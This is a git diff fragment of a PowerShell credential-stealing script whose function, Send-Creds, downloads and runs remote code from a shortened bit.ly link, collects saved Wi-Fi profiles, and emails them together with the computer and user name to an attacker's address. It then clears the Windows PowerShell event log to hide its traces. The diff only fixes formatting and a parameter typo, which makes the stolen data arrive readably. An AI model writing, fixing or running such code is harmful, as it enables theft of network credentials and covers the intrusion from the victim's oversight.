@@ -28,12 +28,12 @@ Function Send-Creds {
 		#Wlan Profiles
 		try {
 			Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2etS486')
-			`$Information = Get-WLAN_Profiles -LANGUAGE es-ES | ft
+			`$Information = Get-WLAN_Profiles -LANGUAGE es-ES | Format-Table | Out-String
 		} catch {}
 		
 		# Send Email
-		`$Subject = 'InformationGathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
-		Send-Email -From '$from' -Password '$Password' -To '$To' - Subject `$Subject -Body `$Information
+		`$Subject = 'Information_Gathered - ' + `$env:COMPUTERNAME + '\' + `$env:USERNAME
+		Send-Email -From '$from' -Password '$Password' -To '$To' -Subject `$Subject -Body `$Information
 		
 		# Clear EventLog
 		Clear-EventLog -LogName 'Windows PowerShell'
